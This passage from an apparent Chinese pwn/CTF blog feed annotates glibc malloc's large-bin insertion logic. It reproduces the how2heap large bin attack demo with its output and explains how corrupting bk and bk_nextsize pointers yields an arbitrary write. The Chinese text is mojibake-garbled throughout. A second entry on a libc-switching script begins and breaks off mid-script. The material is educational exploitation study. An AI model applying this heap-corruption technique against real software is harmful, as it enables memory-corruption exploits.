class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">        <span class="comment">// è¿™ä¸ªåœ°æ–¹çš„bckæ˜¯ä¹‹å‰unsortedbinä¸­çš„ç¬¬äºŒå—ï¼Œå°†bin[1]çš„bkèµ‹å€¼ä¸ºç¬¬äºŒå—ï¼Œå¼€å§‹è¿›è¡Œè„±é“¾æ“ä½œ</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">        <span class="comment">// å°†ç¬¬äºŒå—çš„fdèµ‹å€¼ä¸ºbin[1](ub)</span></span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="comment">// è·å¾—å¯¹åº”largebinçš„index</span></span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">            <span class="comment">// bckä¸ºbin[å¯¹åº”çš„index]ï¼Œè®°ä¸ºbin1</span></span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">            <span class="comment">// fwd = bin1 -&gt; fd ï¼Œå³æ•´ä¸ªé“¾æ¡çš„å°¾éƒ¨</span></span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">            <span class="comment">// largebiné‡Œæœ‰å°±è¿›if</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                <span class="comment">// å¦‚æœè¯¥chunkçš„sizeå°äºbin1 -&gt; bk -&gt; sizeï¼Œ å³å°äºæœ€å‰é¢çš„é‚£ä¸ªï¼Œå°±è¿›if</span></span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;</span><br><span class="line">                    <span class="comment">// fwd = bin1</span></span><br><span class="line">                      fwd = bck;</span><br><span class="line">                    <span class="comment">// bck = bin1 -&gt; bk (ç¬¬ä¸€ä¸ªchunk)</span></span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"><span class="comment">// è°ƒæ•´nextsize: fd_nextsize = bin1 -&gt; fdï¼Œå³æŒ‡å‘æœ€åä¸€ä¸ªchunk</span></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">              <span class="comment">// è°ƒæ•´nextsize: bk_nextsize = bin1 -&gt; fd -&gt; bk_nextsizeï¼Œå³æŒ‡å‘ç¬¬ä¸€ä¸ªchunkï¼ˆè¯¥chunkæ’å…¥åå°†ä¼šæˆä¸ºç¬¬ä¸€ä¸ªchunkï¼‰</span></span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                    <span class="comment">// è°ƒæ•´ç›¸é‚»ä¸¤å—çš„nextsizeï¼Œç¬¬ä¸€å—chunkçš„fd_nextsizeå°†æˆä¸ºvictimï¼Œæœ€åä¸€å—çš„bk_nextsizeå°†ä¼šæˆä¸ºvictimï¼ˆæ­¤æ—¶nextsizeå·²å®Œæˆé“¾è¡¨çš„æ’å…¥æ“ä½œï¼‰</span></span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="comment">// è¯¥chunkå¤§äºå‰é¢é‚£ä¸ªchunkçš„sizeå°±è¿›else</span></span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                    <span class="comment">// ç›´åˆ°è¯¥sizeå¤§äºç­‰äºé“¾è¡¨ä¸­çš„æŸä¸ªsizeï¼ˆä»å°¾éƒ¨å¼€å§‹éå†ï¼Œå³sizeæœ€å¤§çš„åœ°æ–¹å‘å°çš„åœ°æ–¹éå†ï¼‰</span></span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"><span class="comment">// åˆ¤æ–­æ˜¯å¦å’Œsizeç›¸ç­‰ï¼Œç›¸ç­‰çš„è¯å°±é“¾åˆ°å‰é¢</span></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                    <span class="comment">// ä¸ç›¸ç­‰</span></span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                        <span class="comment">// è°ƒæ•´nextsizeï¼Œè¿™ä¸ªæ—¶å€™æ˜¯ä»¥fwdä¸ºç´¢å¼•ï¼Œå› ä¸ºè¿›å…¥äº†whileå¾ªç¯ï¼Œä¸ç¡®å®šfwdæ˜¯å¦å‘ç”Ÿäº†æ”¹å˜ï¼Œbckç´¢å¼•ä¸å†å‡†ç¡®</span></span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                        <span class="comment">// è°ƒæ•´ç›¸é‚»chunkçš„nextsize</span></span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                <span class="comment">// å¯¹åº”çš„æƒ…å†µå°±æ˜¯largebinä¸­åªæœ‰è¿™ä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯è¯¥chunkæ˜¯ç¬¬ä¸€ä¸ªè¿›å…¥largebinçš„å—ï¼Œé‚£ä¹ˆå…¶ä¸¤ä¸ªnextsizeä½éƒ½æ˜¯å…¶æœ¬èº«</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æœ€åéƒ½è¿›è¡Œé“¾è¡¨çš„æ’å…¥</span></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><h3 id="å›¾ç¤º"><a href="#å›¾ç¤º" class="headerlink" title="å›¾ç¤º"></a>å›¾ç¤º</h3><p>ç½‘ç»œä¸Šæœ‰ä¸€å¼ æ¯”è¾ƒç»å…¸çš„largebinçš„å›¾ç¤ºï¼Œæˆ‘å†ç¨å¾®è¡¥å……ä¸€ä¸‹index64çš„fdå’Œbkï¼Œå¤§æ¦‚é•¿è¿™æ ·</p><p><img src="https://i.loli.net/2021/07/26/FVNtTrI52nCuzpj.png" alt="s" style="zoom:50%;" /></p><h3 id="how2heap"><a href="#how2heap" class="headerlink" title="how2heap"></a>how2heap</h3><p>ç”¨libc-2.23.so</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This technique only works with disabled tcache-option for glibc, see glibc_build.sh for build instructions.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">           <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="keyword">void</span> *)(p2 - <span class="number">2</span>), (<span class="keyword">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">            <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">            <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">            <span class="string">&quot; [ %p ]\n\n&quot;</span>, (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="keyword">void</span> *)(p3 - <span class="number">2</span>), (<span class="keyword">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">            <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">            <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">            <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">            <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="keyword">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="keyword">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">This technique only works with disabled tcache-option <span class="keyword">for</span> glibc, see glibc_build.sh <span class="keyword">for</span> build instructions.</span><br><span class="line">This file demonstrates large bin attack by writing a large unsigned long value into stack</span><br><span class="line">In practice, large bin attack is generally prepared <span class="keyword">for</span> further attacks, such as rewriting the global variable global_max_fast <span class="keyword">in</span> libc <span class="keyword">for</span> further fastbin attack</span><br><span class="line"></span><br><span class="line">Let<span class="string">&#x27;s first look at the targets we want to rewrite on stack:</span></span><br><span class="line"><span class="string">stack_var1 (0x7ffe4c957580): 0</span></span><br><span class="line"><span class="string">stack_var2 (0x7ffe4c957588): 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Now, we allocate the first large chunk on the heap at: 0x55616307d000</span></span><br><span class="line"><span class="string">And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the free()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Then, we allocate the second large chunk on the heap at: 0x55616307d360</span></span><br><span class="line"><span class="string">And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the free()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Finally, we allocate the third large chunk on the heap at: 0x55616307d7a0</span></span><br><span class="line"><span class="string">And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the free()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">We free the first and second large chunks now and they will be inserted in the unsorted bin: [ 0x55616307d360 &lt;--&gt; 0x55616307d000 ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [ 0x55616307d0a0 ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Now, we free the third large chunk and it will be inserted in the unsorted bin: [ 0x55616307d7a0 &lt;--&gt; 0x55616307d0a0 ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;</span>s <span class="string">&quot;size&quot;</span> as well as its <span class="string">&quot;bk&quot;</span> and <span class="string">&quot;bk_nextsize&quot;</span> pointers</span><br><span class="line">Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk at the head of the large bin freelist. To overwrite the stack variables, we <span class="built_in">set</span> <span class="string">&quot;bk&quot;</span> to 16 bytes before stack_var1 and <span class="string">&quot;bk_nextsize&quot;</span> to 32 bytes before stack_var2</span><br><span class="line"></span><br><span class="line">Let<span class="string">&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten:</span></span><br><span class="line"><span class="string">stack_var1 (0x7ffe4c957580): 0x55616307d7a0</span></span><br><span class="line"><span class="string">stack_var2 (0x7ffe4c957588): 0x55616307d7a0</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>å…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ”¹æ‰sizeä½¿å¾—p2å˜å°ï¼Œå¹¶ä¸”æ”¹æ‰bkå’Œbk_nextsizeä¸ºæ ˆåœ°å€</p><p>å½“æˆ‘ä»¬malloc(0x90)çš„æ—¶å€™ï¼Œä½äºubçš„p3ä¼šæ‰§è¡Œå¦‚ä¸‹ä»£ç </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     <span class="comment">// p3-&gt;fd_nextsize = p2</span></span><br><span class="line">                     victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                     <span class="comment">// p3-&gt;bk_nextsize = p2-&gt;nextsize = è¦†å†™çš„æ ˆåœ°å€(&amp;stack_var2 - 4)</span></span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                     fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                     <span class="comment">// *(&amp;stack_var2 - 4 + 4) å†™å…¥p3</span></span><br><span class="line">                     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                   &#125;</span><br><span class="line"><span class="comment">// bck = (&amp;stack_var1 - 2)</span></span><br><span class="line">                 bck = fwd-&gt;bk;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">     mark_bin (av, victim_index);</span><br><span class="line"><span class="comment">// p3-&gt;bk = bck = (&amp;stack_var2 - 4)</span></span><br><span class="line">     victim-&gt;bk = bck;</span><br><span class="line"><span class="comment">// p3-&gt;fd = fwd</span></span><br><span class="line">     victim-&gt;fd = fwd;</span><br><span class="line">     fwd-&gt;bk = victim;</span><br><span class="line"><span class="comment">// bck-&gt;fd = *(&amp;stack_var1 - 2 + 2) = p3</span></span><br><span class="line">     bck-&gt;fd = victim;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å€Ÿç”¨A1exå¸ˆå‚…åšå®¢æ€»ç»“å¦‚ä¸‹ï¼š</p><blockquote><ol><li><code>victim</code>ï¼ˆä¹Ÿå³<code>unsorted chunk</code>ï¼‰çš„<code>size</code>å¿…é¡»å¤§äº <code>largebin chunk</code>ï¼Œè¿™æ ·æ‰èƒ½å¤Ÿç»•è¿‡<code>else</code>ä¹‹å‰çš„æ£€æµ‹ï¼›</li><li>æ§åˆ¶<code>fwd-&gt;bk_nextsize</code>ä¸º<code>target_addr1</code>ï¼Œé‚£ä¹ˆæ‰§è¡Œ<code>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize</code>æ—¶ï¼Œå°±èƒ½æ§åˆ¶<code>victim-&gt;bk_nextsize</code>ä¸º <code>traget_addr1</code>;</li><li>æ¥ç€å°±èƒ½æ§åˆ¶ <code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim</code>ï¼Œä¹Ÿå°±ç›¸å½“äº <code>target_addr1-&gt;fd_nextsize = victim</code>ï¼Œæˆ‘ä»¬åœ¨ <code>*(taget_addr1+0x20)=victim</code> å†™å…¥äº† <code>unsorted chunk</code>çš„åœ°å€ï¼›</li><li>ç„¶åï¼Œæˆ‘ä»¬ä¿®æ”¹<code>fwd-&gt;bk</code>ä¸º<code>target_addr2</code>ï¼Œå°±èƒ½æ§åˆ¶ <code>bck</code>ï¼›</li><li>æœ€åï¼Œé€šè¿‡ <code>bck-&gt;fd=victim</code>ï¼Œå°±èƒ½åœ¨ <code>*(target_addr2+0x10)=victim</code>ï¼Œåˆå†™å…¥äº† <code>unsortedbin chunk</code>çš„åœ°å€</li></ol><p>æ€»ç»“å°±æ˜¯ï¼Œå¦‚æœèƒ½å¤Ÿæ§åˆ¶å·²ç»åœ¨<code>largebin</code>ä¸­çš„chunkçš„<code>bkã€bk_nextsize</code>å­—æ®µï¼Œé‚£ä¹ˆå°±èƒ½å®ç°å¾€ä»»æ„åœ°å€å†™å…¥å¾…æ’å…¥<code>largebin</code>çš„chunkçš„åœ°å€ã€‚ä¸€èˆ¬å¾…æ’å…¥çš„<code>chunk</code>åœ°å€ä¸ºå †åœ°å€ï¼Œæ‰€ä»¥é€šè¿‡<code>largebin attack</code>å¯ä»¥å®ç°å¾€ä»»æ„åœ°å€å†™å…¥å †åœ°å€çš„ç›®çš„</p></blockquote><h4 id="åˆ©ç”¨æ‰‹æ³•"><a href="#åˆ©ç”¨æ‰‹æ³•" class="headerlink" title="åˆ©ç”¨æ‰‹æ³•"></a>åˆ©ç”¨æ‰‹æ³•</h4><p>æˆ‘è®¤ä¸ºï¼Œåˆ©ç”¨æ‰‹æ³•å¾ˆç®€è¦ï¼Œæ§åˆ¶largebinä¸­chunkçš„bkå­—æ®µä¸º(&amp;target - 2)æˆ–è€…bk_nextsizeå­—æ®µä¸º(&amp;target - 4)ï¼Œé‚£ä¹ˆtargeté‡Œé¢å°†ä¼šè¢«å†™å…¥å †åœ°å€ï¼Œæ³¨æ„sizeä¸èƒ½ç›¸åŒï¼Œfdç­‰ä½ç½®ç½®0é¿å…è¿›å…¥unlink</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>è®©æˆ‘å…ˆæ‰¾æ‰¾çœ‹2333</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> largebin attack </tag>
            
            <tag> ptmalloc2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellè„šæœ¬ + patchelfæ–¹ä¾¿åˆ‡æ¢libc</title>
      <link href="2021/07/23/switch-libc/"/>
      <url>2021/07/23/switch-libc/</url>
      
        <content type="html"><![CDATA[<h2 id="æ›´ä¾¿æ·åˆ‡æ¢libc"><a href="#æ›´ä¾¿æ·åˆ‡æ¢libc" class="headerlink" title="æ›´ä¾¿æ·åˆ‡æ¢libc"></a>æ›´ä¾¿æ·åˆ‡æ¢libc</h2><p>ç›®å‰è‡ªå·±çš„åˆ‡æ¢libcçš„æ–¹æ³•æ˜¯ç”¨<code>patchelf --set-interpreter</code>æ¢ldæ–‡ä»¶ + <code>LD_PRELOAD</code>æ¢libc<br>å¹¶ä¸”æˆ‘çš„libcéƒ½åœ¨/glibc/ç›®å½•ä¸‹<br><img src="https://i.loli.net/2021/07/23/nwqIE4P7WOvmsj2.png" alt=""></p><p>äºæ˜¯æ„Ÿè§‰æœ‰ç‚¹éº»çƒ¦ï¼Œé‚å†™äº†ä¸ªshellè„šæœ¬ï¼Œä¸»è¦æ˜¯çœç•¥äº†è·¯å¾„ä¸Šçš„å›°éš¾<br>æ€è·¯å°±æ˜¯caseè¯­å¥åˆ¤æ–­æ˜¯å“ªä¸ªç‰ˆæœ¬çš„ï¼Œç„¶ååˆ¤æ–­æ˜¯32è¿˜æ˜¯64ä½çš„ï¼Œè¿˜è¦åŠ ä¸Šä¸€ä¸ªâ€”help<br>æ€è·¯æœ‰ç‚¹æ­»æ¿ï¼Œè·¯å¾„å•¥çš„è¢«æˆ‘å†™æ­»äº†ï¼ˆx</p><p>ç›®å‰æ²¡å‘ç°å•¥é—®é¢˜<br><img src="https://i.loli.net/2021/07/23/mk6QuJPaZO5134F.png" alt=""><br><img src="https://i.loli.net/2021/07/23/V19xLjUle4yrXRF.png" alt=""></p><h2 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/zsh</span></span><br><span class="line"></span><br><span class="line">if [[ $1 = 